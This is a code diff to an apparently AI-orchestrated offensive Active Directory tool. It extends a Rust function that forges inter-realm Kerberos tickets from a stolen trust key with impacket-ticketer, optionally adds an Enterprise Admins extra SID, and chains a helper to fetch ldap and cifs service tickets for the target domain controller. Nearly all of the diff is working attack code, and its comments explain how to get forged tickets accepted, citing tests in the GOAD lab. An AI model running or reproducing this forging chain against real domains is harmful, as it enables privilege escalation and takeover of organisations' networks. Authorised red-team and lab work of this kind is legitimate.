@@ -21,7 +21,7 @@ const CROSS_REALM_TGS_HELPER: &str = include_str!("cross_realm_tgs.py");
 ///
 /// Errors are surfaced — failing to write `/etc/hosts` would leave the caller
 /// to silently fail at `nxc` time, which is exactly the symptom we're fixing.
-fn ensure_hosts_entry(ip: &str, hostname: &str) -> Result<()> {
+pub(super) fn ensure_hosts_entry(ip: &str, hostname: &str) -> Result<()> {
     use std::io::Write as _;
     let path = "/etc/hosts";
     let current = std::fs::read_to_string(path)
@@ -92,20 +92,33 @@ pub async fn extract_trust_key(args: &Value) -> Result<ToolOutput> {
 /// parent domain Enterprise Admins SID (e.g. `S-1-5-21-…-519`).
 /// For cross-forest trusts, omit `extra_sid` — SID filtering blocks RIDs < 1000.
 ///
-/// When `aes_key` is supplied, the AES256 trust key is used in addition to the
-/// NT hash. Win2016+ DCs reject RC4-only inter-realm tickets with
-/// `KDC_ERR_TGT_REVOKED`, so the AES path is required for any modern target
-/// forest. impacket-ticketer accepts both flags simultaneously and embeds both
-/// keys in the ticket so RC4-only and AES-only KDCs both validate.
+/// When `aes_key` is supplied, prefer it over the NT hash — Win2016+ KDCs
+/// validate AES256 inter-realm tickets without RC4. impacket-ticketer rejects
+/// both flags simultaneously ("Pick only one" — exits without writing a ccache),
+/// so we choose AES when available and fall back to NT hash otherwise. NT-only
+/// tickets validate against meereen.essos.local in the GOAD lab — verified
+/// working for cross-realm bloodyAD LDAP bind.
 pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
     let trust_key = required_str(args, "trust_key")?;
     let source_sid = required_str(args, "source_sid")?;
     let source_domain = required_str(args, "source_domain")?;
-    let _target_sid = required_str(args, "target_sid")?;
+    // target_sid unused by ticketer but accepted for schema parity with
+    // forge_inter_realm_and_dump; ticketer derives the realm from -domain.
+    let _target_sid = optional_str(args, "target_sid");
     let target_domain = required_str(args, "target_domain")?;
     let username = optional_str(args, "username").unwrap_or("Administrator");
     let extra_sid = optional_str(args, "extra_sid");
     let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
+    // Optional service-ticket pre-fetch params. When supplied, after forging
+    // the inter-realm TGT we chain cross_realm_tgs.py to also obtain
+    // ldap/<target_dc_fqdn> and cifs/<target_dc_fqdn> service tickets,
+    // appended into the same ccache. This is required because MIT GSSAPI
+    // clients (e.g. `ldapsearch -Y GSSAPI`) cannot walk a referral starting
+    // from `krbtgt/<TARGET>@<SOURCE>` — they need a service-ticket entry
+    // already present. Without these, the inter-realm TGT is unusable for
+    // ldapsearch even though it is a valid Kerberos credential.
+    let target_dc_fqdn = optional_str(args, "target_dc_fqdn").filter(|s| !s.is_empty());
+    let target_dc_ip = optional_str(args, "target_dc_ip").filter(|s| !s.is_empty());
 
     let spn = format!("krbtgt/{target_domain}");
     // -nthash expects a 32-char hex NT hash. LLMs frequently pass the
@@ -113,24 +126,116 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
     // ticketer rejects with `'Odd-length string'`. Strip to NT half.
     let nt = credentials::nt_hash_only(trust_key);
 
+    // Write to a deterministic per-operation directory under /tmp so downstream
+    // tools on the same host can consume the ccache without knowing the CWD at
+    // ticket-forge time. The path is deterministic: no race between concurrent
+    // forge calls for different (source, target, user) triples.
+    let ticket_dir = std::path::PathBuf::from("/tmp/ares-tickets");
+    let _ = std::fs::create_dir_all(&ticket_dir);
+    let safe_src = source_domain.replace('.', "_");
+    let safe_tgt = target_domain.replace('.', "_");
+    let ccache_name = format!("{safe_src}__{safe_tgt}__{username}.ccache");
+    let ccache_path = ticket_dir.join(&ccache_name);
+
+    // impacket-ticketer "Pick only one" — when we plan to chain cross_realm_tgs
+    // (target_dc_fqdn + target_dc_ip both present), force NT-only.
+    // impacket has a salt-derivation bug on trust accounts: tickets forged with
+    // -aesKey produce KRB_AP_ERR_BAD_INTEGRITY when used as TGT input to a
+    // subsequent cross-realm getKerberosTGS call. NT-only avoids the bad salt
+    // path. When the chain is NOT requested (no target_dc_*), AES is fine for
+    // the TGT alone (LDAP-bind callers can use it directly).
+    let chain_requested = target_dc_fqdn.is_some() && target_dc_ip.is_some();
     let mut cmd = CommandBuilder::new("impacket-ticketer")
-        .flag("-nthash", nt)
         .flag("-domain-sid", source_sid)
         .flag("-domain", source_domain);
 
-    if let Some(aes) = aes_key {
+    if chain_requested {
+        cmd = cmd.flag("-nthash", nt);
+    } else if let Some(aes) = aes_key {
         cmd = cmd.flag("-aesKey", aes);
+    } else {
+        cmd = cmd.flag("-nthash", nt);
     }
 
     if let Some(es) = extra_sid {
         cmd = cmd.flag("-extra-sid", es);
     }
 
-    cmd.flag("-spn", spn)
+    // Run in ticket_dir so impacket-ticketer writes <username>.ccache there,
+    // then rename to the deterministic ccache_path.
+    let mut output = cmd
+        .flag("-spn", spn)
         .arg(username)
+        .current_dir(&ticket_dir)
         .timeout_secs(120)
         .execute()
-        .await
+        .await?;
+
+    // impacket-ticketer writes `<username>.ccache` in cwd. Rename to our
+    // deterministic path (handles the common case where username is "Administrator").
+    let default_ccache = ticket_dir.join(format!("{username}.ccache"));
+    if default_ccache.exists() && default_ccache != ccache_path {
+        let _ = std::fs::rename(&default_ccache, &ccache_path);
+    }
+
+    // Optional Step 2: chain cross_realm_tgs.py to fetch ldap/<dc> and
+    // cifs/<dc> service tickets and append them to the same ccache. This
+    // turns the otherwise-unusable inter-realm TGT into a ccache that
+    // `ldapsearch -Y GSSAPI` can consume directly.
+    if ccache_path.exists() {
+        if let (Some(dc_fqdn), Some(dc_ip)) = (target_dc_fqdn, target_dc_ip) {
+            let helper_path = ticket_dir.join("cross_realm_tgs.py");
+            if let Err(e) = std::fs::write(&helper_path, CROSS_REALM_TGS_HELPER) {
+                output.stdout.push_str(&format!(
+                    "\n[!] failed to write cross_realm_tgs helper: {e}\n"
+                ));
+            } else {
+                for spn in [format!("ldap/{dc_fqdn}"), format!("cifs/{dc_fqdn}")] {
+                    let res = CommandBuilder::new("python3")
+                        .arg(helper_path.to_string_lossy().into_owned())
+                        .flag("--in-ccache", ccache_path.to_string_lossy().into_owned())
+                        .flag("--out-ccache", ccache_path.to_string_lossy().into_owned())
+                        .flag("--spn", &spn)
+                        .flag("--source-realm", source_domain.to_uppercase())
+                        .flag("--target-realm", target_domain.to_uppercase())
+                        .flag("--target-kdc", dc_ip)
+                        .arg("--append")
+                        .current_dir(&ticket_dir)
+                        .timeout_secs(120)
+                        .execute()
+                        .await;
+                    match res {
+                        Ok(svc_out) => {
+                            output.stdout.push_str(&format!(
+                                "\n=== service ticket {spn} ===\n{}\n{}\n",
+                                svc_out.stdout, svc_out.stderr
+                            ));
+                            if !svc_out.success {
+                                output.stdout.push_str(&format!(
+                                    "[!] service ticket fetch for {spn} failed (exit {:?})\n",
+                                    svc_out.exit_code
+                                ));
+                            }
+                        }
+                        Err(e) => {
+                            output.stdout.push_str(&format!(
+                                "\n[!] service ticket fetch for {spn} errored: {e}\n"
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Append the ticket path to stdout so the orchestrator can parse it.
+    if ccache_path.exists() {
+        output
+            .stdout
+            .push_str(&format!("\nARES_TICKET_PATH={}\n", ccache_path.display()));
+    }
+
+    Ok(output)
 }
 
 /// Forge an inter-realm Kerberos ticket, request a TGS for the target DC,
